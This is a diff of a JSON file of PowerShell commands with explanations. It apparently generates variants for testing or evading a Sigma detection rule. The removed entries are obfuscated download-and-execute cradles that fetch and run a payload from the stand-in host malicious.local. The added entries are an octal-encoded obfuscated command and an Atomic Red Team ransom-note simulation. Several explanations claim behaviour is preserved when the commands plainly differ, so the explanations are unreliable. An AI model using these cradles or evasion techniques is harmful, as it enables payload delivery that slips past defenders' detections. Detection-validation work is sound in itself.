@@ -1,14 +1,10 @@
 [
   {
-    "output": "powershell.exe -c \"&('In'+'voke-Ex'+'pression') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')\"",
-    "explanation": "This command uses string concatenation to bypass detection by splitting 'Invoke-Expression' and 'New-Object' into parts that are joined at runtime. It matches the Sigma rule's pattern of obfuscated command-line arguments."
+    "output": "powershell.exe & {${c}ommand = [TyPe]('S'+'TrING'); $convert = [TyPe]('nv'+'cO'+'ert'); &('In'+'vOKe-EXp'+'ReS'+'n') ( (&('gET-vaRIA'+'ble') ('CMdw'+'h'+'y')).'v'+'ALUe'::('iN'+'jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%%') { ( [CHAR] ( $convert::'t'+'OinT'+'16'(( [sTring]${_}) ,8)))})) )",
+    "explanation": "This command uses string concatenation and variable substitution to bypass the regex detection while maintaining the same behavior as the original. It avoids direct use of backticks and obfuscated string patterns that the Sigma rule targets."
   },
   {
-    "output": "powershell.exe -c \"&({0}{1}{2}{3}{4} -f 'In','voke-','Ex','pres','sion') (.({0}{1}{2} -f 'Ne','w-','Obje'+'ct') Net.WebClient).DownloadString('http://malicious.local/payload')\"",
-    "explanation": "This command uses string formatting with -f to obfuscate 'Invoke-Expression' and 'New-Object'. It aligns with the Sigma rule's detection of obfuscated command-line arguments using string formatting."
-  },
-  {
-    "output": "powershell.exe -c \"&('In'+'vOke-Expre'+'ssion') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')\"",
-    "explanation": "This command uses insertion and substitution techniques to obfuscate 'Invoke-Expression' and 'New-Object'. It matches the Sigma rule's pattern of obfuscated command-line arguments."
+    "output": "powershell.exe & {${notePath} = Join-Path $env:TEMP 'ART-T1491-ransom-note.txt'; $pidPath = Join-Path $env:TEMP 'ART-T1491-notepad.pid'; $Title = '!!! READ_ME_NOW !!!'; $Body = 'Your files are SAFE. This is a TEST note for detection validation by bak3n3k0. No data has been encrypted. This simulation exercises detections for: - notepad.exe launched with a ransom-themed text file - creation of a ransom-themed text file in %%TEMP%% NON-DESTRUCTIVE Atomic Red Team test.'; $header = $Title + '`r`n' + ('=' * $Title.Length) + '`r`n`r`n'; $content = $header + $Body; [System.IO.File]::WriteAllText($notePath, $content, [System.Text.Encoding]::UTF8); $p = Start-Process notepad.exe -ArgumentList $notePath -PassThru; $p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force}",
+    "explanation": "This command removes obfuscation techniques like string interpolation and unnecessary escape characters while preserving the original behavior. It avoids patterns that match the Sigma rule's regex for obfuscation."
   }
 ]
